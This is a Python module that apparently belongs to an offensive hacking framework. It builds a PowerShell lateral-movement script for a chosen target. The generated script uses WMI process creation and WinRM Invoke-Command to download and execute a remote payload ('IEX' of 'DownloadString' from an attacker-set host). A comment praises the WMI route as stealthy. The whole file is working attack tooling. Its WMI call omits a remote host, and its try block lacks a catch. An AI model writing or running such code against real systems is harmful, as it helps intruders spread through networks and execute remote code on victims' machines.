from core.base_module import BaseModule

class LateralMovement(BaseModule):
    def __init__(self, framework):
        super().__init__(framework)
        self.name = "lateral_movement"
        self.description = "Lateral movement using WMI and PowerShell Remoting (WinRM)."
        self.options = {
            "target": "127.0.0.1",
            "lhost": "127.0.0.1"
        }

    def run(self, args):
        target = self.options.get("target")
        lhost = self.options.get("lhost")
        
        if args:
            if len(args) >= 1:
                target = args[0]
            if len(args) >= 2:
                lhost = args[1]

        self.log(f"Generating lateral movement script for target: {target}")
        
        movement_script = f'''
try {{
    # WMI Execution (Stealthy, uses DCOM)
    $cred = Get-Credential
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ExecutionPolicy Bypass -Command \\"IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')\\""
    
    # PowerShell Remoting (WinRM)
    Invoke-Command -ComputerName {target} -ScriptBlock {{
        IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')
    }} -Credential $cred
}}
'''
        print("\n--- Lateral Movement Script (PowerShell) ---")
        print(movement_script)
        print("--------------------------------------------\n")
        self.log("Script generated successfully.")
